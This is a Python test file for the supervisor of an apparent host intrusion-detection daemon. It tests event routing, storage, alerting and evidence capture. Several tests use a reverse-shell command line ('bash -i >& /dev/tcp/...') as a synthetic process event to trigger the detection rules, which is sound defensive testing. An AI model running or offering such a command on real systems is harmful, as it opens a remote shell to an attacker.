"""Tests for the supervisor."""

from __future__ import annotations

import io
import logging
import threading
import time
from datetime import UTC, datetime
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from inspectord.config import dev_config
from inspectord.parsers.base import build_event
from inspectord.schemas.event import Event, EventKind, Severity
from inspectord.storage.db import Database
from inspectord.supervisor import Supervisor


def test_supervisor_starts_and_routes_events(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    sup = Supervisor(cfg)
    sup.start()
    try:
        deadline = time.monotonic() + 3.0
        events: list[object] = []

        def collect(ev: object) -> None:
            events.append(ev)

        sup.attach_listener(collect)

        while time.monotonic() < deadline and not events:
            time.sleep(0.05)
        assert events, "supervisor did not deliver any events from healthcheck"
    finally:
        sup.stop(timeout=5.0)


def test_supervisor_persists_events_to_db(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    sup = Supervisor(cfg)
    sup.start()
    try:
        time.sleep(1.5)
    finally:
        sup.stop(timeout=5.0)

    with Database(cfg.storage.db_path) as db:
        rows = db.query("SELECT COUNT(*) FROM events_enriched").fetchall()
    assert rows[0][0] >= 1


def test_supervisor_journals_events(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    sup = Supervisor(cfg)
    sup.start()
    try:
        time.sleep(1.5)
    finally:
        sup.stop(timeout=5.0)

    assert any(cfg.storage.journal_dir.glob("*.jsonl.gz"))


def test_supervisor_starts_dependency_manager_worker(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    sup = Supervisor(cfg)
    sup.start()
    try:
        deadline = time.monotonic() + 5.0
        modules: set[str] = set()

        def listener(ev: object) -> None:
            modules.add(getattr(ev, "module", ""))

        sup.attach_listener(listener)

        while time.monotonic() < deadline and "dependency_manager" not in modules:
            time.sleep(0.1)
        assert "dependency_manager" in modules
    finally:
        sup.stop(timeout=5.0)


def test_supervisor_starts_log_tailer_and_fim_watcher(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    sup = Supervisor(cfg)
    sup.start()
    try:
        names = {wp.spec.name for wp in sup._procs}  # type: ignore[attr-defined]
        assert {"healthcheck", "dependency_manager", "log_tailer", "fim_watcher"} <= names
    finally:
        sup.stop(timeout=5.0)


def test_supervisor_fires_rule_and_notifies_listener(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    sup = Supervisor(cfg)
    sup.start()
    try:
        alerts_seen: list[object] = []

        def on_alert(a: object) -> None:
            alerts_seen.append(a)

        sup.attach_alert_listener(on_alert)

        # Wait briefly for setup, then inject a synthetic event.
        time.sleep(0.5)
        ev = build_event(
            module="process_collector",
            action="process_start",
            category=["process"],
            type_=["start"],
            severity="info",
            process={
                "pid": 9999,
                "name": "bash",
                "command_line": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
            },
        )
        sup._inject_for_test(ev)  # type: ignore[attr-defined]
        deadline = time.monotonic() + 3.0
        while time.monotonic() < deadline and not alerts_seen:
            time.sleep(0.05)
        assert alerts_seen, "rule did not fire after synthetic event"
    finally:
        sup.stop(timeout=5.0)


def test_supervisor_persist_projects_service_state(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    cfg.workers = []  # no subprocesses; we inject directly
    sup = Supervisor(cfg)
    sup.start()
    try:
        ev = Event(
            ts=datetime(2026, 6, 16, 12, 0, 0, tzinfo=UTC),
            event_id="svc-1",
            kind=EventKind.event,
            category=["configuration"],
            type=["change"],
            action="service_added",
            severity=Severity.info,
            module="services_monitor",
            service={"name": "cron.service", "state": "active"},
            raw={"source": "systemctl", "active": "active", "sub": "running", "load": "loaded"},
        )
        sup._inject_for_test(ev)
        deadline = time.monotonic() + 2.0
        rows: list = []
        while time.monotonic() < deadline:
            with Database(cfg.storage.db_path) as db:
                rows = db.query(
                    "SELECT active_state FROM service_state WHERE unit='cron.service'"
                ).fetchall()
            if rows:
                break
            time.sleep(0.05)
        assert rows == [("active",)]
    finally:
        sup.stop(timeout=5.0)


def test_supervisor_captures_evidence_on_high_alert(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    cfg.workers = []  # no subprocesses; we inject directly
    sup = Supervisor(cfg)
    sup.start()
    try:
        ev = Event(
            ts=datetime(2026, 6, 22, tzinfo=UTC),
            event_id="ev-1",
            kind=EventKind.event,
            category=["file"],
            type=["change"],
            action="file_modified",
            severity=Severity.info,
            module="fim_watcher",
            file={"path": "/etc/sudoers"},
        )
        sup._inject_for_test(ev)
        deadline = time.monotonic() + 3.0
        ev_rows: list = []
        while time.monotonic() < deadline:
            with Database(cfg.storage.db_path) as db:
                cases = db.query("SELECT case_id FROM cases").fetchall()
                if cases:
                    ev_rows = db.query("SELECT kind FROM case_evidence").fetchall()
                    if ev_rows:
                        break
            time.sleep(0.05)
        assert ev_rows, "expected case_evidence rows from the high-sev alert"
        kinds = {r[0] for r in ev_rows}
        assert "net_state" in kinds and "event_bundle" in kinds
    finally:
        sup.stop(timeout=5.0)


def test_supervisor_persist_projects_process_state(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    cfg.workers = []  # no subprocesses; we inject directly
    sup = Supervisor(cfg)
    sup.start()
    try:
        ev = Event(
            ts=datetime(2026, 6, 16, 12, 0, 0, tzinfo=UTC),
            event_id="proc-1",
            kind=EventKind.event,
            category=["process"],
            type=["start"],
            action="process_start",
            severity=Severity.info,
            module="process_collector",
            process={"pid": 4242, "name": "bash", "command_line": "bash -i"},
            user={"id": "1000"},
            raw={"source": "ebpf"},
        )
        sup._inject_for_test(ev)
        deadline = time.monotonic() + 2.0
        rows: list = []
        while time.monotonic() < deadline:
            with Database(cfg.storage.db_path) as db:
                rows = db.query("SELECT status FROM process_state WHERE pid=4242").fetchall()
            if rows:
                break
            time.sleep(0.05)
        assert rows == [("running",)]
    finally:
        sup.stop(timeout=5.0)


# --------------------------------------------------------------------------
# _dispatch: the one path every event takes (worker readers + monitor)
# --------------------------------------------------------------------------


def _reverse_shell_event() -> Event:
    """An event the starter pack alerts on, so the alert path actually runs."""
    return build_event(
        module="process_collector",
        action="process_start",
        category=["process"],
        type_=["start"],
        severity="info",
        process={
            "pid": 9999,
            "name": "bash",
            "command_line": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
        },
    )


def _fake_worker(lines: list[bytes]) -> Any:
    """A stand-in _WorkerProc whose stdout is a canned byte stream."""
    return SimpleNamespace(
        spec=SimpleNamespace(name="fake"),
        proc=SimpleNamespace(stdout=io.BytesIO(b"".join(line + b"\n" for line in lines))),
    )


def test_event_is_published_even_when_the_alert_path_raises(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
) -> None:
    """A failing rule/alert path must never swallow the event itself.

    alerts.dedup does a SELECT-then-UPDATE that can raise on a concurrent
    conflict; if that killed the publish, a security event would be lost
    entirely -- unstored, unprojected, invisible.
    """
    cfg = dev_config(base=tmp_path)
    cfg.workers = []  # no subprocesses; we inject directly
    sup = Supervisor(cfg)
    sup.start()
    try:

        def boom(_ev: Event) -> list[object]:
            raise RuntimeError("conflict on update!")

        monkeypatch.setattr(sup._rule_engine, "process", boom)
        seen: list[Event] = []
        sup.attach_listener(seen.append)

        ev = _reverse_shell_event()
        with caplog.at_level(logging.ERROR):
            sup._inject_for_test(ev)

        deadline = time.monotonic() + 3.0
        while time.monotonic() < deadline and not any(e.event_id == ev.event_id for e in seen):
            time.sleep(0.01)
        assert any(e.event_id == ev.event_id for e in seen), (
            "the event was dropped because the alert path raised"
        )
        assert "alert path failed" in caplog.text
    finally:
        sup.stop(timeout=5.0)


def test_worker_events_fan_out_alerts_on_the_reader_thread(tmp_path: Path) -> None:
    """Alert fan-out must stay on the thread that read the worker's line."""
    cfg = dev_config(base=tmp_path)
    cfg.workers = []
    sup = Supervisor(cfg)
    sup.start()
    try:
        threads: list[threading.Thread] = []
        sup.attach_alert_listener(lambda _a: threads.append(threading.current_thread()))

        ev = _reverse_shell_event()
        sup._read_stdout(_fake_worker([ev.model_dump_json().encode("utf-8")]))

        assert threads, "no alert fanned out for a worker-emitted event"
        assert all(t is threading.current_thread() for t in threads), (
            "alert fan-out moved off the reader thread"
        )
    finally:
        sup.stop(timeout=5.0)


def test_reader_survives_a_malformed_line_and_reports_it_accurately(
    tmp_path: Path, caplog: pytest.LogCaptureFixture
) -> None:
    cfg = dev_config(base=tmp_path)
    cfg.workers = []
    sup = Supervisor(cfg)
    sup.start()
    try:
        seen: list[Event] = []
        sup.attach_listener(seen.append)
        ev = _reverse_shell_event()
        with caplog.at_level(logging.ERROR):
            sup._read_stdout(_fake_worker([b"{not json", ev.model_dump_json().encode("utf-8")]))
        assert "emitted invalid event" in caplog.text

        deadline = time.monotonic() + 3.0
        while time.monotonic() < deadline and not any(e.event_id == ev.event_id for e in seen):
            time.sleep(0.01)
        assert any(e.event_id == ev.event_id for e in seen), (
            "a malformed line stopped the reader from dispatching the next one"
        )
    finally:
        sup.stop(timeout=5.0)
